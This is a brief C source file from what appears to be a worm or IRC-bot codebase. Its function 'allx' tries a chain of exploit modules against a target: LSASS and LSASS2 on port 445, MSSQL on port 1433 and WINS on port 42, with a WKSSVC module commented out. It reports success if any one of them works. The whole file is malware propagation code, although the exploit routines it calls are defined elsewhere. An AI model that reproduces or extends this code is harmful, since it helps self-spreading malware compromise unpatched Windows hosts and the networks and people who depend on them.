#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

#ifndef NO_LSASS
#ifndef NO_LSASS2
#ifndef NO_WKSSVC
#ifndef NO_MSSQL
#ifndef NO_WINS
BOOL allx(EXINFO exinfo)
{	
	//LSASS + LSASS2
	exinfo.port = 445;
	BOOL bLSASS = Lsass(exinfo);
	exinfo.port = 445;
	BOOL bLSASS2 = lsass2(exinfo);
	
	//WKSSVC_ENG + WKSSVC_OTHER
//	exinfo.port = 445;
//	BOOL bro0t1 = ro0t1(exinfo);

	//MSSQL + WINS
	exinfo.port = 1433;
	BOOL bMSSQL = MSSQL(exinfo);
	exinfo.port = 42;
	BOOL bWINS = Wins(exinfo);

	return bLSASS || bLSASS2 || bMSSQL || bWINS ? TRUE : FALSE;
}
#endif
#endif
#endif
#endif
#endif

